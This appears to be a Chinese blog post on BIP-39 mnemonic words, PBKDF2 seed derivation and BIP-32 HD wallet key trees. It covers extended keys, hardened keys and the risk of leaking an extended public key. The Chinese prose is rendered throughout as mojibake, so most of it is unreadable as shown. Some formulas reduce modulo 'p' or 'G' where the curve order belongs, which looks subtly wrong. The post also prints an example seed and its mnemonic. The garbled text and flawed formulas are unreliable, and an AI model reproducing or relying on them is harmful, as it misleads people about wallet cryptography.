<p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹ï¼Œæ€ä¹ˆæ ·ä»ç§å­ç”Ÿæˆå¯†é’¥æ ‘ã€‚å› ä¸º16è¿›åˆ¶è¡¨ç¤ºçš„ç§å­ï¼š 0C1E24E5917779D297E14D45F14E1A1A éš¾ä»¥è®°å¿†ï¼Œæ‰€ä»¥BIP-39æ ‡å‡†ä¸­å®šä¹‰äº†åŠ©è®°è¯ã€‚ä¸Šé¢çš„ç§å­ç›¸å¯¹åº”çš„åŠ©è®°è¯è¡¨ç¤ºï¼š</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>æ€è€ƒï¼š128ä½æ˜¯å¦‚ä½•ç”Ÿæˆ12ä¸ªåŠ©è®°è¯çš„ï¼Ÿ</p>
<p>åŠ©è®°è¯æ˜¯ç”±é’±åŒ…ä½¿ç”¨BIP-39ä¸­å®šä¹‰çš„æ ‡å‡†åŒ–è¿‡ç¨‹è‡ªåŠ¨ç”Ÿæˆçš„ã€‚ é’±åŒ…ä»ç†µæºå¼€å§‹ï¼Œå¢åŠ æ ¡éªŒå’Œï¼Œç„¶åå°†ç†µæ˜ å°„åˆ°å•è¯åˆ—è¡¨ï¼š</p>
<p>1ã€åˆ›å»ºä¸€ä¸ª128åˆ°256ä½çš„éšæœºåºåˆ—ï¼ˆç†µï¼‰ã€‚</p>
<p>2ã€æå‡ºSHA256å“ˆå¸Œå‰å‡ ä½ï¼ˆç†µé•¿&#x2F; 32ï¼‰ï¼Œå°±å¯ä»¥åˆ›é€ ä¸€ä¸ªéšæœºåºåˆ—çš„æ ¡éªŒå’Œã€‚</p>
<p>3ã€å°†æ ¡éªŒå’Œæ·»åŠ åˆ°éšæœºåºåˆ—çš„æœ«å°¾ã€‚</p>
<p>4ã€å°†åºåˆ—åˆ’åˆ†ä¸º<strong>åŒ…å«</strong>11ä½çš„ä¸åŒéƒ¨åˆ†ã€‚</p>
<p>5ã€å°†æ¯ä¸ªåŒ…å«11ä½éƒ¨åˆ†çš„å€¼ä¸ä¸€ä¸ªå·²ç»é¢„å…ˆå®šä¹‰2048ä¸ªå•è¯çš„å­—å…¸åšå¯¹åº”ã€‚</p>
<p>6ã€ç”Ÿæˆçš„æœ‰é¡ºåºçš„å•è¯ç»„å°±æ˜¯åŠ©è®°ç ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233053.jpg" alt="img"></p>
<p>æ€»ç»“ä¸€ä¸‹ï¼šHDé’±åŒ…å…·æœ‰ç®¡ç†å¤šä¸ªå¯†é’¥å’Œåœ°å€çš„å¼ºå¤§æœºåˆ¶ã€‚ç”±ä¸€ç³»åˆ—è‹±æ–‡å•è¯ç”Ÿæˆç§å­æ˜¯ä¸ªæ ‡å‡†åŒ–çš„æ–¹æ³•ï¼Œè¿™æ ·æ˜“äºåœ¨é’±åŒ…ä¸­è½¬ç§»ã€å¯¼å‡ºå’Œå¯¼å…¥ï¼Œ è¿™äº›è‹±æ–‡å•è¯è¢«ç§°ä¸ºåŠ©è®°è¯ï¼Œæ ‡å‡†ç”±BIP-39å®šä¹‰ã€‚å¤§å¤šæ•°æ¯”ç‰¹å¸é’±åŒ…ï¼ˆä»¥åŠå…¶ä»–åŠ å¯†è´§å¸çš„é’±åŒ…ï¼‰ä½¿ç”¨æ­¤æ ‡å‡†ï¼Œå¹¶å¯ä»¥ä½¿ç”¨å¯äº’æ“ä½œçš„åŠ©è®°è¯å¯¼å…¥å’Œå¯¼å‡ºç§å­è¿›è¡Œå¤‡ä»½å’Œæ¢å¤ã€‚</p>
<p>16è¿›åˆ¶è¡¨ç¤ºï¼š 0C1E24E5917779D297E14D45F14E1A1A</p>
<p>åŠ©è®°è¯è¡¨ç¤ºï¼š</p>
<p>army van defense carry jealous true garbage claim echo media make crunch</p>
<p>åŠ©è®°è¯è¡¨ç¤ºé•¿åº¦ä¸º128è‡³256ä½çš„ç†µã€‚ é€šè¿‡ä½¿ç”¨å¯†é’¥å»¶ä¼¸å‡½æ•°PBKDF2ï¼Œç†µè¢«ç”¨äºå¯¼å‡ºè¾ƒé•¿çš„ï¼ˆ512ä½ï¼‰ç§å­ã€‚å°†æ‰€å¾—çš„ç§å­ç”¨äºæ„å»ºç¡®å®šæ€§é’±åŒ…å¹¶å¾—åˆ°å…¶å¯†é’¥ã€‚</p>
<p>æ€è€ƒï¼šèƒ½ä¸èƒ½æš´åŠ›ç ´è§£ä»–äººçš„é’±åŒ…ï¼Ÿ</p>
<p>åˆ›å»ºåŠ©è®°è¯ä¹‹åçš„7-9æ­¥æ˜¯ï¼š</p>
<p>7ã€PBKDF2å¯†é’¥å»¶ä¼¸å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»æ­¥éª¤6ç”Ÿæˆçš„åŠ©è®°ç¬¦ã€‚</p>
<p>8ã€PBKDF2å¯†é’¥å»¶ä¼¸å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç›ã€‚ ç”±å­—ç¬¦ä¸²å¸¸æ•°â€œåŠ©è®°è¯â€ä¸å¯é€‰çš„ç”¨æˆ·æä¾›çš„å¯†ç å­—ç¬¦ä¸²è¿æ¥ç»„æˆã€‚</p>
<p>9ã€PBKDF2ä½¿ç”¨HMAC-SHA512ç®—æ³•ï¼Œä½¿ç”¨2048æ¬¡å“ˆå¸Œæ¥å»¶ä¼¸åŠ©è®°ç¬¦å’Œç›å‚æ•°ï¼Œäº§ç”Ÿä¸€ä¸ª512ä½çš„å€¼ä½œä¸ºå…¶æœ€ç»ˆè¾“å‡ºã€‚ è¿™ä¸ª512ä½çš„å€¼å°±æ˜¯ç§å­ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233054.jpg" alt="img"></p>
<p>æœ‰ä¸ªè¿™ä¸ª512æ¯”ç‰¹çš„ç§å­ï¼Œå¯ä»¥å¼€å§‹å…¬ç§é’¥å¯¹çš„ç”Ÿæˆã€‚</p>
<p>æ€»ç»“ï¼šHDé’±åŒ…ä»å•ä¸ªæ ¹ç§å­ï¼ˆroot seedï¼‰ä¸­åˆ›å»ºã€‚æœ€å¸¸è§çš„æ˜¯ï¼Œè¿™ä¸ªç§å­æ˜¯ä»åŠ©è®°ç¬¦äº§ç”Ÿçš„ï¼ŒHDé’±åŒ…çš„æ‰€æœ‰çš„ç¡®å®šæ€§éƒ½è¡ç”Ÿè‡ªè¿™ä¸ªæ ¹ç§å­ã€‚ä»»ä½•å…¼å®¹HD é’±åŒ…çš„æ ¹ç§å­ä¹Ÿå¯é‡æ–°åˆ›é€ æ•´ä¸ªHDé’±åŒ…ã€‚æ‰€ä»¥ç®€å•çš„è½¬ç§»HDé’±åŒ…çš„æ ¹ç§å­å°±è®©HDé’±åŒ…ä¸­æ‰€åŒ…å«çš„æˆåƒä¸Šç™¾ä¸‡çš„å¯†é’¥è¢«å¤åˆ¶ï¼Œå‚¨å­˜å¯¼å‡ºä»¥åŠå¯¼å…¥ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233055.jpg" alt="img"></p>
<p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œä»root seedç”Ÿæˆå…¬ç§é’¥å¯¹çš„è¿‡ç¨‹ï¼Œå°±æ˜¯å¯¹root seedè¿›è¡Œä¸€æ¬¡HMAC-SHA512çš„åŠ å¯†å“ˆå¸Œï¼Œåœ¨ç”Ÿæˆ512çš„ç»“æœä¹‹åï¼Œå°†512ä½ç»“æœåˆ’åˆ†ä¸ºä¸¤ä¸ª256éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯Master private keyï¼ˆä¸»ç§é’¥ï¼‰å’ŒMaster Chain Codeï¼ˆä¸»é“¾ç ï¼‰ã€‚</p>
<p>HMAC-SHA512 ä½¿ç”¨ SHA512 å“ˆå¸Œç®—æ³•ï¼Œä»¥ä¸€ä¸ªæ¶ˆæ¯ï¼ˆMessageï¼‰å’Œä¸€ä¸ªå¯†é’¥ï¼ˆKeyï¼‰ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆ 512 ä½ï¼ˆ64 å­—èŠ‚ï¼‰çš„æ¶ˆæ¯æ‘˜è¦ï¼ˆDigestï¼‰ä½œä¸ºè¾“å‡ºã€‚</p>
<p>ä»ç§å­è®¡ç®—ä¸»ç§é’¥æ—¶ï¼Œç§å­ä½œä¸ºè¾“å…¥çš„æ¶ˆæ¯ï¼Œå­—ç¬¦ä¸²<code>Bitcoin seed</code>ä½œä¸ºè¾“å…¥çš„å¯†é’¥ï¼Œè®¡ç®—äº§ç”Ÿ 512 ä½çš„è¾“å‡ºã€‚</p>
<ul>
<li>è¾“å‡ºçš„é«˜ 256 ä½ï¼Œæ˜¯ä¸»ç§é’¥</li>
<li>è¾“å‡ºçš„ä½ 256 ä½ï¼Œæ˜¯ä¸»é“¾ç ï¼ˆMaster Chain Codeï¼‰</li>
</ul>
<p>æ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>ç§å­ä»åŠ©è®°è¯å’Œç”¨æˆ·å¯†è¯­è®¡ç®—è€Œæ¥</li>
<li>åŠ©è®°è¯ä»ä¸€ä¸ªéšæœºåºåˆ—è®¡ç®—è€Œæ¥ï¼ŒæŸ¥é˜…ç‰¹å®šçš„å•è¯è¡¨åæœ€ç»ˆç¡®å®š</li>
<li>å³ä½¿éšæœºåºåˆ—çš„å†…å®¹ä¸€æ ·ï¼ŒæŸ¥é˜…ä¸åŒè¯­è¨€çš„å•è¯è¡¨ï¼Œå¯ä»¥å¾—åˆ°ä¸åŒçš„åŠ©è®°è¯ï¼Œä»è€Œè®¡ç®—å‡ºä¸åŒçš„ç§å­</li>
<li>å³ä½¿åŠ©è®°è¯çš„å†…å®¹ä¸€æ ·ï¼ŒæŒ‡å®šä¸åŒçš„å¯†è¯­ï¼Œå¯ä»¥å¾—åˆ°ä¸åŒçš„ç§å­</li>
</ul>
<p><strong>HD é’±åŒ…çš„ç¡®å®šæ€§æ¥æºäºç§å­ï¼Œå½“ç§å­ç¡®å®šåï¼Œé’±åŒ…ä¸­çš„æ‰€æœ‰ç§é’¥å°±éƒ½æ˜¯ç¡®å®šçš„ï¼Œéƒ½å¯ä»¥ä»ç§å­è®¡ç®—å‡ºæ¥</strong>ã€‚</p>
<p>æ‰€ä»¥ç”¨æˆ·å¯ä»¥ç›´æ¥è®°å½•ä¸‹è¿™ä¸ªç§å­çš„å€¼ï¼Œä½œä¸º HD é’±åŒ…çš„å¤‡ä»½ï¼Œåªä¸è¿‡è¿™ä¸€å¤§ä¸²å†…å®¹æŠ„å†™èµ·æ¥æœ‰ç‚¹éº»çƒ¦ã€‚</p>
<p>å¯¹ä¸€ä¸ª HD é’±åŒ…ï¼Œåˆå§‹åŒ–ç§å­çš„è¿‡ç¨‹æ¶‰åŠåˆ°ä¸¤ä¸ª<strong>å˜é‡</strong>ï¼š</p>
<ul>
<li>åŠ©è®°è¯ï¼ˆç”±éšæœºåºåˆ—çš„å†…å®¹å’ŒåŠ©è®°è¯çš„è¯­è¨€å…±åŒå†³å®šï¼‰</li>
<li>ç”¨æˆ·æŒ‡å®šçš„å¯†è¯­</li>
</ul>
<p>æ‰€ä»¥åœ¨å¤‡ä»½ HD é’±åŒ…æ—¶ï¼Œéœ€è¦<strong>åŒæ—¶å¤‡ä»½åŠ©è®°è¯å’Œå¯†è¯­</strong>ï¼Œè¿™æ ·å°±ç›¸å½“äºå¤‡ä»½äº†æ•´ä¸ªé’±åŒ…å†…çš„æ‰€æœ‰ç§é’¥ã€‚</p>
<p>HD é’±åŒ…ä¸­çš„ç§é’¥æ˜¯æ ‘çŠ¶çš„å±‚çº§ç»“æ„ã€‚</p>
<ul>
<li>æ ‘æ ¹ä½ç½®çš„ç§é’¥ï¼Œç§°ä¸ºä¸»ç§é’¥ï¼ˆMaster Private Keyï¼‰ï¼Œä»ç§å­ç›´æ¥è®¡ç®—å¾—åˆ°</li>
<li>æ ‘ä¸­çš„æŸä¸ªç§é’¥ï¼Œä»å…¶çˆ¶ç§é’¥è®¡ç®—å¾—åˆ°ã€‚</li>
</ul>
<hr>
<p>ç„¶åä»ä¸Šå›¾ä¸­è¿˜å¯ä»¥çœ‹åˆ°ä»ä¸»ç§é’¥æœ‰ä¸ªç®­å¤´åˆ°Master Public Keyï¼Œä¹Ÿå³ä»ç§é’¥åˆ°å…¬é’¥ã€‚</p>
<p>HDåè®®ä½¿ç”¨çš„æ˜¯ECDSAå…¬é’¥å‡½æ•° point()ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªå¤§æ•´æ•°ï¼ˆä¹Ÿå³ç§é’¥ï¼‰ï¼Œå°†å®ƒè½¬æ¢æˆå›¾ä¸Šçš„ä¸€ä¸ªç‚¹ï¼Œä¹Ÿå³å…¬é’¥ã€‚è¿™ä¹Ÿå’Œæˆ‘ä»¬çš„å¸¸è¯†æ˜¯ç¬¦åˆçš„ï¼Œéå¯¹ç§°åŠ å¯†ç³»ç»Ÿä¸­ï¼Œå…¬ç§é’¥å¯ä»¥äº’ç›¸ç”Ÿæˆã€‚è€Œä¸”æ¤­åœ†æ›²çº¿æ•°å­¦æ–¹æ¡ˆä½¿å¾—å¯ä»¥åœ¨ä¸æ³„éœ²ç§é’¥çš„æƒ…å†µä¸‹è®¡ç®—å…¬é’¥ã€‚ä¾‹å¦‚ï¼Œè¿™å…è®¸ç½‘ç»œå•†åº—ä¸šåŠ¡è®©å…¶ç½‘ç»œæœåŠ¡å™¨ä¸ºæ¯ä¸ªè®¢å•æˆ–æ¯ä¸ªå®¢æˆ·ç”Ÿæˆæ–°çš„åœ°å€ï¼ˆå…¬é’¥å“ˆå¸Œï¼‰ï¼Œè€Œæ— éœ€è®©ç½‘ç»œæœåŠ¡å™¨è®¿é—®ç›¸åº”çš„ç§é’¥ï¼ˆèŠ±è´¹æ”¶åˆ°çš„èµ„é‡‘æ˜¯å¿…éœ€çš„ï¼‰ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point(private_key) == public_key</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆå‰©ä¸‹çš„256ä½è¦ä½œä¸ºé“¾ç å‘¢ï¼Ÿé“¾ç æ˜¯ç”¨æ¥å¹²å•¥çš„å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘ä»¬è¦ç¨å¾®äº†è§£ä¸€ä¸‹pointçš„å·¥ä½œç‰¹ç‚¹ã€‚ä¸‹é¢çš„è¿™ä¸ªç­‰å¼æ˜¯æˆç«‹çš„ã€‚æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œçš„å‚æ•° iç†è§£ä¸ºindexï¼Œä¹Ÿå³ç”Ÿæˆå­å¯†é’¥æ—¶çš„ç´¢å¼•ã€‚é€šè¿‡å°†ç¥–å…ˆç§é’¥ä¸ç´¢å¼• i ç›¸åŠ ï¼Œç„¶åä¼ å…¥åˆ°point()ä¸­ï¼Œå¯ä»¥ç”Ÿæˆå­å…¬é’¥ï¼Œè¿™æ˜¯å·¦è¾¹çš„è®¡ç®—ï¼ˆç§é’¥ç”Ÿæˆå…¬é’¥ï¼Œæ”¹å˜ç§é’¥ï¼Œä¹Ÿå°±ç”Ÿæˆæ–°çš„å…¬ç§é’¥å¯¹ï¼‰ã€‚ç­‰å¼å³è¾¹æ˜¾ç¤ºçš„æ˜¯ï¼Œæ–°ç”Ÿæˆçš„è¿™ä¸ªå…¬é’¥å®Œå…¨ä¸éœ€è¦ä½¿ç”¨ç§é’¥æ¥ç”Ÿæˆï¼Œç›´æ¥æ ¹æ®ç¥–å…ˆå…¬é’¥æ¥åšå°±è¡Œäº†ã€‚ä¹Ÿå³ï¼Œåªè¦æœ‰å…¬é’¥ï¼Œå°±å¯ä»¥ç”Ÿæˆæ–°çš„å…¬é’¥ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (parent_private_key + i) % p ) == parent_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>æ–°ç”Ÿæˆçš„å­å…¬é’¥å¯ä»¥ç»§ç»­ç”Ÿæˆåä»£å…¬é’¥ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">point( (child_private_key + i) % p ) == child_public_key + point(i)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç‰¹ç‚¹å¸¦æ¥çš„å½±å“æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<ol>
<li>å¦‚æœå…±äº«ä¸€å¯¹ç¥–å…ˆå¯†é’¥çš„ä¸¤ä¸ªç¨‹åºæƒ³å°±ä¸€ç³»åˆ—çš„å…¬ç§é’¥å¯¹è¾¾æˆä¸€è‡´ï¼Œå®ƒä»¬åªéœ€è¦å…±åŒå•†è®®ç¡®å®šä¸‹æ¥ä¸€ç³»åˆ—çš„æ•´æ•°å°±è¡Œäº†ã€‚</li>
<li>çŸ¥é“ä¸€ä¸ªç¥–å…ˆå…¬é’¥ï¼Œå¯ä»¥ç”Ÿæˆå¤šä¸ªå­å…¬é’¥ï¼Œç„¶åè¿™äº›å­å…¬é’¥å¯ä»¥ç”¨æ¥åœ¨ä¸å®‰å…¨çš„æœåŠ¡å™¨ä¸Šä½¿ç”¨ï¼Œä½œä¸ºä»˜æ¬¾çš„æ¥æ”¶åœ°å€ã€‚å› ä¸ºæœåŠ¡å™¨å¹¶ä¸çŸ¥é“ç§é’¥ï¼Œæ‰€ä»¥æœåŠ¡å™¨å³ä½¿è¢«æ”»å‡»ï¼Œä¹Ÿä¸ä¼šæœ‰ç§é’¥æ³„éœ²çš„å±é™©ã€‚</li>
<li>ä¸è®ºæ˜¯å­å…¬é’¥è¿˜æ˜¯æ›´ä¸‹å±‚çš„åä»£å…¬é’¥ï¼Œå¦‚æœæ˜¯ä»å­å…¬é’¥èƒ½å¤Ÿæ¨å¯¼å‡ºè‡ªå·±çš„å…„å¼Ÿå§å¦¹å…¬é’¥ï¼Œé‚£ä¹ˆç”Ÿæˆå¤šä¸ªå…¬é’¥å’Œåªæœ‰ä¸€ä¸ªå…¬é’¥æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚å› ä¸ºä»»ä½•äººåªè¦çŸ¥é“å…¶ä¸­çš„ä¸€ä¸ªï¼Œå°±èƒ½æ‰¾å‡ºå…¶ä»–æ‰€æœ‰çš„ã€‚æ‰€ä»¥éœ€è¦åŠ å…¥æ–°çš„è®¡ç®—å‚æ•°ï¼Œåˆ‡æ–­åŒä¸€çˆ¶èŠ‚ç‚¹ç”Ÿæˆçš„å…„å¼Ÿå§å¦¹å…¬é’¥ä¹‹é—´çš„è”ç³»ã€‚</li>
</ol>
<p><strong>æ‰©å±•å¯†é’¥</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233056.jpg" alt="img"></p>
<p>HDåè®®ä½¿ç”¨256ä½çš„Chain Codeï¼ˆä¹Ÿç§°ä½œç†µï¼‰æ¥ç”Ÿæˆå­å¯†é’¥å¯¹ï¼Œè€Œä¸”æ¯ä¸ªå­å¯†é’¥å¯¹éƒ½æœ‰è‡ªå·±çš„chain codeã€‚è¿™æ ·ï¼Œå³ä½¿æœ‰ä¸€ä¸ªå­å¯†é’¥åˆ†æ”¯è¢«æ”»å‡»ï¼Œå…¶ä»–çš„åˆ†æ”¯å¯ä»¥ä¸å—å½±å“ã€‚</p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒHDå¯†é’¥çš„ç”Ÿæˆæ¥æ”¶äº†å››ä¸ªè¾“å…¥ï¼š</p>
<ul>
<li>ç¥–å…ˆç§é’¥ å’Œ ç¥–å…ˆå…¬é’¥</li>
<li>256ä½çš„ç¥–å…ˆé“¾ç </li>
<li>32ä½çš„ç´¢å¼•å€¼</li>
</ul>
<p>ä¸Šå›¾çš„è®¡ç®—ä¸­ï¼Œé“¾ç ã€å…¬é’¥å’Œç´¢å¼•å€¼ä½œä¸ºHMAC-SHA512çš„å‚æ•°è¾“å…¥ï¼Œäº§ç”Ÿ512ä½ç¡®å®šçš„ä½†æ˜¯è¶³å¤Ÿéšæœºçš„è¾“å‡ºã€‚è¿™512ä½è¾“å‡ºçš„å³ä¸€åŠçš„256ä½ä½œä¸ºå­å¯†é’¥çš„é“¾ç ã€‚å·¦ä¸€åŠçš„256ä½ä½œä¸ºç”Ÿæˆå­å¯†é’¥çš„è¾“å…¥lefthand_hash_outputã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">child_private_key == (parent_private_key + lefthand_hash_output) % G</span><br><span class="line">child_public_key == point( (parent_private_key + lefthand_hash_output) % G )</span><br><span class="line">child_public_key == point(child_private_key) == parent_public_key + point(lefthand_hash_output)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä¸‰ä¸ªç­‰å¼ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­ç§é’¥çš„ç”Ÿæˆï¼›ç¬¬äºŒä¸ªæ˜¯ä»å­ç§é’¥ç”Ÿæˆå­å…¬é’¥ï¼›ç¬¬ä¸‰ä¸ªæ˜¯ä»çˆ¶å…¬é’¥ç›´æ¥ç”Ÿæˆå­å…¬é’¥ã€‚ã€æ³¨1ï¼šå› ä¸ºå­å…¬é’¥å’Œçˆ¶å…¬é’¥ä¹‹é—´çš„å…³ç³»ä¾èµ–äº point(lefthand_hash_output)ï¼Œ è€Œpoint(lefthand_hash_output)çš„å€¼ä¾èµ–äºé“¾ç ã€çˆ¶å…¬é’¥å’Œç´¢å¼•ï¼Œç¼ºå°‘çš„å€¼ä»…ä»…æ˜¯é“¾ç ã€‘ã€æ³¨2ï¼šå› ä¸ºçˆ¶å…¬é’¥å·²çŸ¥ï¼Œé“¾ç åœ¨åŒä¸€å¯¹çˆ¶å…¬ç§é’¥çš„æƒ…å†µä¸‹çš„æ˜¯å›ºå®šçš„ï¼Œå¦‚æœé“¾ç æ³„éœ²çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯å¯ä»¥æ¨å¯¼å‡ºå…„å¼Ÿå§å¦¹å…¬é’¥ï¼›ã€‘ã€æ³¨3ï¼šå› æ­¤ï¼Œæ‰©å±•å…¬é’¥ï¼Œä¸åŒäºå…¬é’¥ï¼Œå…¬é’¥æ˜¯ç†æ‰€å½“ç„¶åº”è¯¥å…¬å¼€çš„ï¼›è€Œæ‰©å±•å…¬é’¥å› ä¸ºæ˜¯å…¬é’¥å’Œé“¾ç çš„è¿æ¥ï¼Œä¸ºäº†ä¿æŠ¤é“¾ç ï¼Œåº”è¯¥ä¿æŠ¤æ‰©å±•å…¬é’¥ã€‘</p>
<p>ã€Specifying different index numbers will create different unlinkable <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> from the same <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/parent-key">parent keys</a>. Repeating the procedure for the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/child-key">child keys</a> using the <a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/chain-code">child chain code</a> will create unlinkable grandchild keys.ã€‘</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œæ ¹æ® <a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">BIP-32</a> çš„å®šä¹‰ï¼š</p>
<ul>
<li>å¯ä»¥ä»ç§é’¥å’Œé“¾ç ï¼Œè¡ç”Ÿå‡ºå…¶<strong>æ‰€æœ‰çš„</strong>å­ç§é’¥åŠå¯¹åº”çš„å­å…¬é’¥ï¼ˆåŠä¹‹åæ¯å±‚æ‰€æœ‰çš„å­ç§é’¥åŠå¯¹åº”çš„å­å…¬é’¥ï¼‰</li>
<li>å¯ä»¥ä»å…¬é’¥å’Œé“¾ç ï¼Œè¡ç”Ÿå‡ºå…¶<strong>å¸¸è§„è¡ç”Ÿ</strong>çš„å­å…¬é’¥ï¼ˆåŠä¹‹åæ¯å±‚å¸¸è§„è¡ç”Ÿçš„å­å…¬é’¥ï¼‰</li>
<li>æ— æ³•ä»æŸä¸ªå¯†é’¥ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰è®¡ç®—å‡ºå…¶çˆ¶å¯†é’¥ï¼Œæˆ–åŒå±‚çš„å…¶ä»–å…„å¼Ÿå¯†é’¥</li>
</ul>
<hr>
<p>è¡ç”Ÿå­å¯†é’¥æ—¶éœ€è¦å°†å¯†é’¥ã€é“¾ç å’Œå­å¯†é’¥åºå·ä½œä¸º CKD çš„è¾“å…¥ï¼Œä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚ä¸ºäº†æ–¹ä¾¿è½¬å½•ï¼Œå¯ä»¥å°†<strong>å¯†é’¥</strong>å’Œ<strong>é“¾ç </strong>ç¼–ç åœ¨ä¸€èµ·ï¼Œå¾—åˆ°<strong>æ‰©å±•å¯†é’¥</strong>ï¼ˆExtended Keyï¼‰ã€‚æ‰©å±•ç§é’¥å’Œç›¸å¯¹åº”çš„æ‰©å±•å…¬é’¥å…·æœ‰ç›¸åŒçš„é“¾ç ã€‚æ‰©å±•å¯†é’¥ä½¿ç”¨ Base58Check ç¼–ç ï¼Œå¹¶æ·»åŠ ç‰¹å®šçš„ç‰ˆæœ¬å‰ç¼€ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233057.jpg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233058.jpg" alt="img"></p>
<p>å®‰å…¨æ€§ï¼š</p>
<p>æ‰©å±•å¯†é’¥ä½¿ç”¨æ–¹ä¾¿ï¼Œä½†è¦æ³¨æ„ï¼š</p>
<ul>
<li>è™½ç„¶æ³„éœ²æŸä¸ªæ‰©å±•å…¬é’¥ä¸ä¼šä¸¢å¸ï¼Œä½†ä¼šå¯¼è‡´ä»¥æ­¤ä¸ºæ ¹èŠ‚ç‚¹è¡ç”Ÿå‡ºçš„æ‰©å±•å…¬é’¥å…¨éƒ¨æ³„éœ²ï¼Œç ´åäº†éšç§æ€§</li>
<li>æ³„éœ²æ‰©å±•å…¬é’¥å’Œè¯¥å…¬é’¥è¡ç”Ÿå‡ºçš„ä¹‹åä»»ä¸€ä»£å…¬é’¥å¯¹åº”çš„ç§é’¥ï¼Œæœ‰è¢«æ¨å¯¼å‡ºè¯¥æ‰©å±•å…¬é’¥æ‰€æœ‰åä»£ç§é’¥çš„å¯èƒ½</li>
</ul>
<p>ä¹Ÿå³ï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†çˆ¶é“¾ç å’Œçˆ¶å…¬é’¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å¾—æ‰€æœ‰çš„å­é“¾ç ã€‚æœ‰äº†å­é“¾ç ï¼Œå¦‚æœåˆè·å¾—äº†åº•å±‚çš„æŸä¸€ä¸ªç§é’¥ï¼ˆå­™å­å¯†é’¥ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥æ ¹æ®è¿™ä¸ªé“¾ç ç”Ÿæˆæ‰€æœ‰çš„æ‰©å±•ç§é’¥ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233059.jpg" alt="img"></p>
<p>æ›´æƒ¨çš„æ˜¯ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡å­å¯†é’¥é€†æ¨å›ç¥–å…ˆç§é’¥ã€‚ä¹Ÿå³ï¼Œå¦‚æœæ”»å‡»è€…è·å¾—äº†ä¸€ä¸ªæ‰©å±•å…¬é’¥ï¼Œä»¥åŠä»»ä½•å®ƒçš„å­å­™ç§é’¥ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿæ¨å‡ºè¿™ä¸ªå…¬é’¥å¯¹åº”çš„ç§é’¥ï¼Œä»¥åŠæ‰€æœ‰çš„åä»£å¯†é’¥ã€‚</p>
<p>å› æ­¤ï¼Œæ‰©å±•å…¬é’¥çš„é“¾ç éƒ¨åˆ†éœ€è¦å¥½å¥½ä¿å­˜ã€‚ä¹Ÿå› æ­¤æå‡ºäº†å¼ºåŒ–å­å¯†é’¥çš„æ¦‚å¿µã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233060.jpg" alt="img"></p>
<p>å¼ºåŒ–çš„å­å¯†é’¥ç”Ÿæˆéœ€è¦ç¥–å…ˆé“¾ç ã€ç¥–å…ˆç§é’¥å’Œç´¢å¼•å€¼ç”Ÿæˆå­é“¾ç å’Œå­ç§é’¥ã€‚è¿™æ ·çš„è¯ï¼Œä»…ä»…çŸ¥é“ç¥–å…ˆæ‰©å±•å…¬é’¥ä¸èƒ½ç”¨æ¥ç”Ÿæˆå¼ºåŒ–çš„å­å…¬é’¥ã€‚ï¼ˆæ— æ³•ç”ŸæˆLeft-hand-outputï¼Œæ‰€ä»¥çŸ¥é“çˆ¶å…¬é’¥çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¸èƒ½ç›´æ¥è®¡ç®—å‡ºå­å…¬é’¥ï¼›ï¼‰</p>
